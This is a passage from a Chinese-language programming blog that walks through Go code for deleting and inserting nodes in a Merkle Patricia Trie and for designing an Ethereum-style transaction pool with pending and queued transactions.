class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">n.Children[key[<span class="number">0</span>]] = child</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>统计子节点<ul><li>遍历16个子节点，数有多少个非空的（有效）；</li><li><code>lastChildIndex</code> 记录最后一个非空节点索引（方便后续压缩用）</li></ul></li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">nonNilChildren := <span class="number">0</span></span><br><span class="line">lastChildIndex := <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i, child := <span class="keyword">range</span> n.Children &#123;</span><br><span class="line"><span class="keyword">if</span> child != <span class="literal">nil</span> &#123;</span><br><span class="line">nonNilChildren++</span><br><span class="line">lastChildIndex = i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>判断是否压缩</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> nonNilChildren == <span class="number">1</span> &amp;&amp; n.Value == <span class="literal">nil</span> &#123;</span><br><span class="line">child := n.Children[lastChildIndex]</span><br><span class="line"><span class="keyword">if</span> child.Type == ExtensionNode &#123;</span><br><span class="line"><span class="keyword">return</span> NewExtensionNode(<span class="built_in">append</span>([]<span class="type">byte</span>&#123;<span class="type">byte</span>(lastChildIndex)&#125;, child.Key...), child.Children[<span class="number">0</span>]), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> NewLeafNode(<span class="built_in">append</span>([]<span class="type">byte</span>&#123;<span class="type">byte</span>(lastChildIndex)&#125;, child.Key...), child.Value), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>压缩的条件<ul><li>当前分支节点只剩下 1个有效子节点；</li><li>当前分支节点没有自己的 value（即它不是路径终点）；</li></ul></li><li>压缩实现<ul><li>新节点的路径是原来的子节点路径，前面加上该子节点所在分支索引 lastChildIndex（即4bit的路径片段）；</li><li>如果子节点是 ExtensionNode，就把它的 Key 合并起来，构造新的 ExtensionNode（路径更长，指向下一级）；<ul><li>BranchNode -&gt; index 2 → ExtensionNode [3, 4]</li><li>压缩后为ExtensionNode [2, 3, 4]</li></ul></li><li>如果子节点是 LeafNode，也类似，构造新的叶子节点，路径合并，值继承<ul><li>BranchNode-&gt;index 2 → LeafNode [3, 4] → “Hello”</li><li>压缩后为LeafNode [2, 3, 4] → “Hello”</li></ul></li></ul></li><li>如果都不满足压缩条件，就直接返回当前节点</li></ul><p>那么当匹配到分支节点的时候，递归调用后，有是如何呢，让我们继续看</p><p>匹配到扩展节点时，要进行递归调用<code>child, err := m.delete(n.Children[0], key[len(n.Key):])</code> 此时会进入分支节点的逻辑，</p><ul><li>如果返回的child是扩展节点，就进行压缩为一个新的扩展节点</li><li>如果返回的是分支节点或者叶子节点，说明不能压缩了，保留原结构</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> ExtensionNode:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; <span class="built_in">len</span>(n.Key) || !bytes.Equal(n.Key, key[:<span class="built_in">len</span>(n.Key)]) &#123;</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">child, err := m.<span class="built_in">delete</span>(n.Children[<span class="number">0</span>], key[<span class="built_in">len</span>(n.Key):])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> child == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> child.Type == ExtensionNode &#123;</span><br><span class="line"><span class="keyword">return</span> NewExtensionNode(<span class="built_in">append</span>(n.Key, child.Key...), child.Children[<span class="number">0</span>]), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> NewExtensionNode(n.Key, child), <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>删除的情况我们都说完了，小结一下，从n.root开始向下查找要删除的节点，找到删除后，再递归返回时，看有没有特殊情况进行压缩，一直递归返回一个新的root,此时删除已经完成</p><h3 id="insert-在MPT中插入或更新节点"><a href="#insert-在MPT中插入或更新节点" class="headerlink" title="insert 在MPT中插入或更新节点"></a>insert 在MPT中插入或更新节点</h3><p>这个是非常难的逻辑了，很复杂，但是理清逻辑就很好写了<br>有了之前的递归思想，其实插入的逻辑就是考虑的情况比较多而已，要把每一种的逻辑都要想好</p><p>对传入的key,进行转化为niblle数组，方便我们比较路径，最后还是返回的是一个新root,与之前查找删除的逻辑有些区别的是，它先要找到插入的位置，所以就必须使用到之前说介绍的计算公共前缀的方式</p><p><strong>匹配到叶子节点</strong><br>还是看它的公共前缀是否相等，相等就插入</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> LeafNode:</span><br><span class="line">common := commonPrefix(n.Key, key)</span><br><span class="line"><span class="keyword">if</span> common == <span class="built_in">len</span>(n.Key) &amp;&amp; common == <span class="built_in">len</span>(key) &#123;</span><br><span class="line">n.Value = value</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有一个与之匹配的叶子节点，即common为零，就新建一个分支节点，分别把叶子节点和插入节点放入</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">branch := NewBranchNode()</span><br><span class="line"><span class="keyword">if</span> common == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(n.Key) &gt; <span class="number">0</span> &#123;</span><br><span class="line">branch.Children[n.Key[<span class="number">0</span>]] = NewLeafNode(n.Key[<span class="number">1</span>:], n.Value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">branch.Value = n.Value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) &gt; <span class="number">0</span> &#123;</span><br><span class="line">branch.Children[key[<span class="number">0</span>]] = NewLeafNode(key[<span class="number">1</span>:], value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">branch.Value = value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> branch, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有公共前缀，但是不等于<code>len(n.key)</code>或者<code>len(key)</code>,就创建一个扩展节点+分支节点</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">extension := NewExtensionNode(key[:common], branch)</span><br><span class="line"><span class="keyword">if</span> common &lt; <span class="built_in">len</span>(n.Key) &#123;</span><br><span class="line">branch.Children[n.Key[common]] = NewLeafNode(n.Key[common+<span class="number">1</span>:], n.Value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">branch.Value = n.Value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> common &lt; <span class="built_in">len</span>(key) &#123;</span><br><span class="line">branch.Children[key[common]] = NewLeafNode(key[common+<span class="number">1</span>:], value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">branch.Value = value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> extension, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>叶子节点是很好理解的了</p><p><strong>匹配到是扩展节点</strong></p><p>要考虑俩种情况，公共前缀正好匹配，公共前缀不匹配。</p><p>计算公共前缀，等于<code>len(n.key)</code>,再进入递归，继续沿着<code>key[common:]</code>路径找</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">common := commonPrefix(n.Key, key)</span><br><span class="line"><span class="keyword">if</span> common == <span class="built_in">len</span>(n.Key) &#123;</span><br><span class="line">child, err := m.insert(n.Children[<span class="number">0</span>], key[common:], value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">n.Children[<span class="number">0</span>] = child</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不等于len(n.key)，以公共前缀作为一个新的扩展节点，剩下的放入建立的分支节点中<br><strong>分支一：</strong>处理扩展节点的剩余节点（common &lt; len(n.key)）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> common &lt; <span class="built_in">len</span>(n.Key) &#123;</span><br><span class="line">child, err := m.insert(n.Children[<span class="number">0</span>], n.Key[common+<span class="number">1</span>:], n.Children[<span class="number">0</span>].Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">branch.Children[n.Key[common]] = child</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>原扩展路径中有剩余：从 <code>n.Key[common:]</code> 开始递归插入原有子节点</p></li><li><p>注意：<code>n.Key[common]</code> 是分歧点的第一个字节，要作为 BranchNode 的索引使用</p></li><li><p>剩下的路径<code>（n.Key[common+1:]）</code>挂载到新插入的子节点中</p></li></ul><blockquote><p>解释为什么这里要递归旧路径剩余的部分：递归 insert，是为了保留原路径的“剩余部分”，并构建新的树结构。递归只是为了让逻辑统一，不必区分是 Leaf 还是 Extension</p></blockquote><p>**分支二:**处理新插入的路径(common &lt; len(key) )</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> common &lt; <span class="built_in">len</span>(key) &#123;</span><br><span class="line">branch.Children[key[common]] = NewLeafNode(key[common+<span class="number">1</span>:], value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">branch.Value = value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>如果新插入的 key 在分歧点后还有内容，就将其余的部分作为新 <code>LeafNode</code> 添加进分支中。</p></li><li><p>如果新 key 恰好终止在分歧点，则直接挂值到 <code>BranchNode.Value</code></p></li></ul><p>特殊情况没有共同前缀，直接返回分支节点</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> common == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> branch, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>匹配到分支节点</strong><br>匹配到了一个 <code>BranchNode</code>，说明插入路径之前已经有公共前缀了，当前路径开始要根据 nibble 分支继续走</p><p>如果插入的路径已经完全匹配当前的节点，直接就把值赋值上去</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BranchNode:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span> &#123;</span><br><span class="line">n.Value = value</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不完全匹配，再次进行递归insert</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">child, err := m.insert(n.Children[key[<span class="number">0</span>]], key[<span class="number">1</span>:], value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">n.Children[key[<span class="number">0</span>]] = child</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>当路径匹配到 <code>BranchNode</code>，继续根据 <code>nibble</code> 走对应子节点递归插入；如果路径正好结束，就把值挂在当前分支节点上<br><img src="C:\Users\ASUS\blog\source_posts\image.png" alt="插入流程图"></p><p><strong>mpt的简要流程已完成</strong>，状态讲完了，接下来继续交易池。</p><h2 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a>交易池</h2><p>简单介绍与一下设计的目标</p><ul><li><p>以太坊 <code>TxPool </code>原理：区分 <code>pending</code> 和 <code>queued</code> 交易。</p><ul><li><p>pending：交易的 <code>nonce</code> 与链上账户的 <code>nonce</code> 连续（刚好下一笔），可以立刻准备打包。</p></li><li><p>queued：交易的 <code>nonce</code> 超前，前面的交易未提交或未确认，需要排队等待。</p></li></ul></li><li><p>交易需要 根据 <code>GasPrice </code>优先排序，<code>GasPrice</code> 高的交易更优先被矿工打包。</p></li><li><p>支持 交易替换（<code>nonce</code> 相同、<code>GasPrice</code> 更高的交易替换旧交易）。</p></li><li><p>以方便快速查询、插入和排序为目标。</p></li></ul><h3 id="交易的结构"><a href="#交易的结构" class="headerlink" title="交易的结构"></a>交易的结构</h3><p><strong>交易的结构有俩个组成部分</strong>：交易数据和交易签名</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">txdata</span><br><span class="line">signature</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>交易数据（tx.data）</strong>  结合注释看</p><blockquote><p>以太坊中为什么交易数据没有<code>from</code>地址,是因为在以太坊上，发送者地址是通过对交易内容进行签名后，使用签名和交易数据恢复出来的</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> txdata <span class="keyword">struct</span> &#123;</span><br><span class="line">To       Address  <span class="comment">// 目标地址</span></span><br><span class="line">Nonce    <span class="type">uint64</span>   <span class="comment">// 交易计数器（防重放）</span></span><br><span class="line">Value    <span class="type">uint64</span>   <span class="comment">// 转账金额（单位待定）</span></span><br><span class="line">Gas      <span class="type">uint64</span>   <span class="comment">// 交易燃料上限</span></span><br><span class="line">GasPrice <span class="type">uint64</span>   <span class="comment">// 每单位燃料价格</span></span><br><span class="line">Input    []<span class="type">byte</span>   <span class="comment">// 交易输入数据（合约调用数据）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>签名（signature）</strong> 是基于<code>secp256k1 </code>曲线</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> signature <span class="keyword">struct</span> &#123;</span><br><span class="line">R, S *big.Int  <span class="comment">// ECDSA 签名的两个大整数参数</span></span><br><span class="line">V    <span class="type">uint8</span>     <span class="comment">// 恢复ID，标识公钥恢复的补充信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于刚刚的为什么以太坊没有<code>from</code>这个字段，是因为恢复出来的，那么就要实现一个函数，进行对<code>from</code>地址的恢复</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx Transaction)</span></span> From() Address &#123;</span><br><span class="line"><span class="comment">// 1. 编码交易数据</span></span><br><span class="line">txdata := tx.txdata</span><br><span class="line">toSign, err := rlp.EncodeToBytes(txdata)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;RLP encoding failed: %v&quot;</span>, err))</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Encoded txdata:&quot;</span>, hexutil.Encode(toSign))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 计算消息哈希</span></span><br><span class="line">msg := sha3.Keccak256(toSign)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 构造签名 sig: R(32字节) || S(32字节) || V(1字节)</span></span><br><span class="line">sig := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">rBytes := tx.R.Bytes()</span><br><span class="line">sBytes := tx.S.Bytes()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：Bytes() 可能不足 32 字节，需要左边补 0</span></span><br><span class="line"><span class="built_in">copy</span>(sig[<span class="number">32</span>-<span class="built_in">len</span>(rBytes):<span class="number">32</span>], rBytes)</span><br><span class="line"><span class="built_in">copy</span>(sig[<span class="number">64</span>-<span class="built_in">len</span>(sBytes):<span class="number">64</span>], sBytes)</span><br><span class="line">sig[<span class="number">64</span>] = tx.V</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 恢复公钥</span></span><br><span class="line">pubKey, err := secp256k1.RecoverPubkey(msg, sig)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;recover pubkey failed: %v&quot;</span>, err))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 计算地址（例如 keccak(pubkey)[12:]）</span></span><br><span class="line"><span class="keyword">return</span> PubKeyToAddress(pubKey)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>对交易数据 <code>txdata</code> 做 <code>RLP</code> 编码和 <code>Keccak256 </code>哈希</p></li><li><p>将签名中的<code> R, S, V</code> 正确拼接成一个 65 字节的 <code>sig</code> 数组</p></li><li><p>调用 <code>secp256k1.RecoverPubkey()</code> 进行恢复</p></li><li><p>返回正确的发送者地址（<code>from</code>）</p></li></ul><h3 id="交易池的设计"><a href="#交易池的设计" class="headerlink" title="交易池的设计"></a>交易池的设计</h3><p>设计一个txpool接口，想一下交易池中需要什么功能，首先是不是需要接受交易，弹出交易，其次要更新当前状态树的根哈希，去报交易池状态与链同步，交易池发出一个交易后，是不是还要进行一个广播，那么这个接口该怎么写呢</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TxPool <span class="keyword">interface</span> &#123;</span><br><span class="line">NewTx(tx *types.Transaction) TxPool</span><br><span class="line"></span><br><span class="line">Pop() *types.Transaction</span><br><span class="line"></span><br><span class="line">SetStatRoot(h hash.Hash)</span><br><span class="line"></span><br><span class="line">NotifyTxEvent(txs []*types.Transaction)</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><table><thead><tr><th>功能点</th><th>说明</th></tr></thead><tbody><tr><td>📥 接收交易<code>（NewTx）</code></td><td>根据 nonce&#x2F;gasPrice 分类，存入队列</td></tr><tr><td>📤 弹出交易<code>（Pop） </code></td><td>为区块打包模块提供优质交易</td></tr><tr><td>📊 状态同步<code>（SetStatRoot)</code></td><td>绑定状态树根，便于切换状态版本</td></tr><tr><td>📢 通知事件<code>（NotifyTxEvent）</code></td><td>广播交易给外部系统（如 P2P 网络）</td></tr></tbody></table><p>我们可以通过新建一个<code>DefaultPool</code>来是实现交易池里详细的操作</p><h4 id="txpool数据结构"><a href="#txpool数据结构" class="headerlink" title="txpool数据结构"></a>txpool数据结构</h4><p>我们都知道，交易池有俩种状态，<code>pending</code>和<code>queue</code>，它们是通过交易的<code>nonce</code>值来判断进入哪一种状态，实现一下如果是只有一个地址里面的交易，我们是不是通过对<code>nonce</code>值的排序就很好确认是否该进入<code>pending</code>状态，但是通常与一个交易池里不会有只有一个地址的交易，这是时候如果还只通过判断<code>nonce</code>值来确认状态的话，就不合理了。有一个事实，应该大家都知道，矿工会优先打包<code>gas</code>费高的交易，那么是不是我们就可以设计一个列表，按照<code>gas</code>费大小来等待被打包。</p><p>比如有A，B俩种地址，它们分别有不同的交易（<code>nonce</code>值在前，<code>gas</code>费在后）：</p><ul><li><code>A1(2，9)，A2(3,4),A3(6,9),B1(7,8),B2(2,11),B3(8,8)</code><ul><li>按照同种地址按nonce大小排序，不同地址按照gas费大小排序的话，那么此时的打包顺序：<code>B1,A1,B3,A2</code> ,剩下的因为<code>nonc</code>e值不能连续，进入<code>queue</code></li></ul></li></ul><p>这时我们想一下，采用哪种结构去实现这个逻辑呢</p><p>首先<code>queue</code>的结构，用数组实现可以吗</p><p>为什么不可以————,数组的插入和查找，是不是都要历遍后才能知道，时间复杂度为<code>O(n)</code>,效率低下。不适合交易量大的交易池</p><p>那么我们通过对<code>mpt</code>的学习，知道<code>key,value</code>，实际上是不是一个<code>map</code>映射，如果我们采用<code>map</code>映射的结构设计<code>queue</code>，单说查找插入效率是不是为<code>O(1)</code>。因为我们的<code>queue</code>储存的不同交易地址的交易列表，所以<code>key</code>为地址，<code>value</code>就为对应的交易列表</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">queued   <span class="keyword">map</span>[types.Address][]*types.Transaction</span><br></pre></td></tr></table></figure><p>再来想一下刚刚的例子。</p><p><code>B1,A1,B3,A2 </code>，待打包的交易，也就是<code>pending</code>,如果也用<code>map</code>结构设计，如：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">pending   <span class="keyword">map</span>[types.Address][]*types.Transaction</span><br></pre></td></tr></table></figure><p>那我们排好的打包顺序是不是就不能就不能体现了，因为你还是一个地址对应的交易，我们要的<code>B1,A1,B3,A2</code>执行顺序就表示不出来，这个时候是不是就想，如果后面时排好的交易列表，那我们的key又如何设计呢，所以如果我们还用这个<code>map</code>结构设计<code>pending</code>的话，就不能很好的表示。</p><p>这个时候就想，如果就把<code>pending</code>设计为交易列表，不用<code>map</code>映射，就可以了吗？</p><p>又来考虑一个新的问题，<code>pending</code>为交易列表，当一个新的交易来时，如果判断它进入<code>pending</code>还是<code>queue</code></p><p>用<code>nonce</code>？,那么你又如何确定<code>pending</code>最后的一个交易的地址呢，就算它是同一地址，你比较<code>nonce</code>,如果交易的<code>nonce</code>比<code>pending</code>最后一个交易<code>nonce</code>还小，那么它就要插入到前面去，这是你又如何判断它的插入的位置呢，并且还是在不考虑<code>gas</code>的情况下，更不要说如何确定进入<code>queue</code>。</p><p>这个时候，如果我们把相邻的相同地址用一个盒子框住，每次比较的时候就和盒子的最后一个交易比较，就比刚刚比较容易多了</p><p><strong>例子：</strong></p><ul><li><p><code>A1(2，10)，A2(3,9),A3(4,8),B1(7,8),B2(2,11),B3(8,9)</code> </p></li><li><p>排序后：<code>B1,A1,A2,B3,A4 </code></p></li><li><p>此时把B1看成为一个盒子1，A1,A2看成一个盒子2，B3看成一个盒子3，A3看成为一个盒子4</p></li><li><p>也就是说这个交易列表是一个有多个盒子数组的列表</p></li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> pendingTxs []SortedTxs</span><br><span class="line"></span><br><span class="line">txs      pendingTxs</span><br></pre></td></tr></table></figure><p>那么一个盒子<code>SortedTxs</code>的接口如何设计呢</p><p>首先 ，盒子添加一个交易，除去一个交易，比较的是时候，是不是还要gas,nonce,所以先设计车呢这样的，后续需要的时候的再来添加</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SortedTxs <span class="keyword">interface</span> &#123;</span><br><span class="line">GasPrice() <span class="type">uint64</span></span><br><span class="line">Push(tx *types.Transaction)</span><br><span class="line">Pop() *types.Transaction</span><br><span class="line">Nonce() <span class="type">uint64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>既然定义了接口，就要去实现<br>**GasPrice()**，返回该盒子的第一个交易的 <code>gasPrice</code></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sorted DefaultSortedTxs)</span></span> GasPrice() <span class="type">uint64</span> &#123;</span><br><span class="line">first := sorted[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> first.GasPrice()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为你在 放入的时候是按 <code>gasPrice</code> 从高到低排序的，所以第一个交易就是 <code>gasPrice</code> 最大的交易</p><blockquote><p>而且在同一个地址的交易，由于<code>nonce</code>小优先被执行，所以你后面的交易gas如果设计的比它大也没有什么用，所以也是一个 <code>gasPrice</code> 从高到低排序</p></blockquote><p><strong>Push()</strong>:向当前交易组添加一笔新的交易，然后按 <code>gasPrice</code> 从高到低重新排序。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sorted *DefaultSortedTxs)</span></span> Push(tx *types.Transaction) &#123;</span><br><span class="line">*sorted = <span class="built_in">append</span>(*sorted, tx)</span><br><span class="line">sort.Slice(sorted, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (*sorted)[i].GasPrice() &gt; (*sorted)[j].GasPrice()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**Pop()**：弹出当前交易组中的<code>gasPrice </code>最高的交易（第一个交易）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sorted *DefaultSortedTxs)</span></span> Pop() *types.Transaction &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(*sorted) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">tx := (*sorted)[<span class="number">0</span>]</span><br><span class="line">*sorted = (*sorted)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> tx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Nonce()</strong>:获取这组交易的最后一个交易的 <code>Nonce</code>，表示这组交易的“最后<code> nonce</code>”</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sorted DefaultSortedTxs)</span></span> Nonce() <span class="type">uint64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sorted[<span class="built_in">len</span>(sorted)<span class="number">-1</span>].Nonce()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在比较 <code>SortedTxs</code> 组时，你可以根据<code>nonce</code>判断它是否是账户当前应该执行的下一笔交易。<br>也就是说这一组 <code>SortedTxs</code> 是该账户待打包交易中，最早的一组连续。</p><p>现在又来考虑，当一个交易来的时候，因为我们设计的交易列表的地址不同，是不是还是不好的快速查找插入哪个地址的盒子中，这个时候就要用到我们的<code>map</code>,设计一个<code>pending</code>,使用<code>map</code>结构，用地址对应每个盒子数组，当一个交易来的时候，就能快速找到要插入的地址，然后再在这个地址里的盒子数组里比较，是不是连续的<code>nonce</code>值，不是，就放入<code>queue</code>。</p><blockquote><p>这里我们使用指针，当<code>pending</code>结构更改后，我们的交易列表由于指针的影响，也会对应的更改。</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">pendings <span class="keyword">map</span>[types.Address][]SortedTxs</span><br></pre></td></tr></table></figure><p>由于之前新建一个<code>DefaultPool</code>来实现交易池里详细的操作，所以我们先实现它的结构</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> DefaultSortedTxs []*types.Transaction</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DefaultPool <span class="keyword">struct</span> &#123;</span><br><span class="line">StatDB   statdb.StatDB</span><br><span class="line">all      <span class="keyword">map</span>[hash.Hash]<span class="type">bool</span></span><br><span class="line">txs      pendingTxs</span><br><span class="line">pendings <span class="keyword">map</span>[types.Address][]SortedTxs</span><br><span class="line">queued   <span class="keyword">map</span>[types.Address][]*types.Transaction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>StatDB statdb.StatDB</strong> ：交易池依赖的状态数据库</p><ul><li><p>这是一个接口，负责获取和更新账户的链上状态（比如 nonce）。</p></li><li><p>在交易进池时，需要知道发送方地址当前的 nonce 才能判断交易是：</p><ul><li><p>有效<code>（pending）</code></p></li><li><p>未来的<code>（queued）</code></p></li><li><p>重复&#x2F;过期<code>（丢弃）</code></p></li></ul></li></ul><p>比如后续会使用到的</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">account := pool.StatDB.Load(tx.From())</span><br><span class="line"><span class="keyword">if</span> account.Nonce &gt;= tx.Nonce() &#123;</span><br><span class="line"><span class="comment">// nonce 太小 → 交易已处理或无效</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>all map[hash.Hash]bool</strong>:去重用哈希集合，避免重复交易</p><ul><li><p>存储所有已进入交易池的交易哈希（<code>tx hash</code>）</p></li><li><p>用于防止同一笔交易被重复加入</p></li></ul><h4 id="交易池实际操作"><a href="#交易池实际操作" class="headerlink" title="交易池实际操作"></a>交易池实际操作</h4><p>在之前我们定义了txpool的接口，也就是我们交易池实际的操作接口，知道交易池结构了，现在来一一实现</p><p>首先来看，交易池中处理新交易的核心逻辑<code>NewTx（）</code></p><p><strong>NewTx</strong>:将一笔新的交易 <code>tx </code>放入交易池中适当的位置（<code>pending</code> &#x2F; <code>queue</code> &#x2F; 替换）</p><p>逻辑：</p><ul><li><code>nonce</code> &#x3D;&#x3D; 当前账户的<code>nonce+1</code>,可以连续执行，就放入<code>pending</code></li><li><code>nonce</code> &gt; 当前账户的<code>nonce+1</code>,不可连续执行，放入<code>queue</code></li><li><code>nonce</code> &lt;&#x3D; 当前账户的<code>nonce+1</code>,这时就看交易的<code>gas</code>大小，如果新来的交易<code>gas</code>大，即发生替换</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *DefaultPool)</span></span> NewTx(tx *types.Transaction) &#123;</span><br><span class="line">account := pool.StatDB.Load(tx.From())</span><br><span class="line"><span class="keyword">if</span> account.Nonce &gt;= tx.Nonce() &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">nonce := account.Nonce</span><br><span class="line">blks := pool.pendings[tx.From()]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(blks) &gt; 